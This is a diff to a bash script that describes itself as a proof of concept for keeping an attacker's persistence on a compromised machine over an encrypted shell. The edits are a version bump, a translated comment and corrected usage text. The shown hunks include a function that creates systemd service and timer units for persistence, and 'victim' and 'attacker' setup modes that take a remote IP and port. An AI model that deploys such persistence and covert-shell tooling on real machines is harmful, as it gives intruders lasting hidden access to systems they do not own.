@@ -1,6 +1,6 @@
 #!/bin/bash
 
-## Version: v3.6
+## Version: v3.7
 ## Autor: BeeMo
 ## Purpose: This script is a PoC of how an attacker could maintain persistence on
 ## 	    a compromised machine and at the same time encrypt his communications in
@@ -153,7 +153,7 @@ EOF
 	}
 
 	function persistencyDaemonSetup {
-		# Crea un demoni de tipus .service i de tipus .timer per a encryptedShellv3.5.sh
+		# Creates daemons .service and .timer for encryptedShellv3.7.sh
 
 
 		echo -e "[Unit]\n" \
@@ -185,10 +185,10 @@ then
                 " ./ecryptedShellSetupv2.0.sh {victim/attacker}\n" \
                 "\n" \
                 "Modes: victim: Sets up the configuration on the victim PC.\n" \
-		"	Example: ./encryptedShellSetupv2.0.sh victim {remoteIP} {remotePort}\n" \
+		"	Example: ./encryptedShellSetup.sh victim {remoteIP} {remotePort}\n" \
 		"	**DISCLAIMER**: victim requires sudo to setup persistency!\n\n" \
                 "       attacker: Sets up the configuration on the attacker PC.\n" \
-		"	Example: ./encryptedShellSetupv2.0.sh attacker {localPort}\n\n" \
+		"	Example: ./encryptedShellSetup.sh attacker {localPort}\n\n" \
                 "For further details review the script as its well documented.\n"
 	exit 1
 else
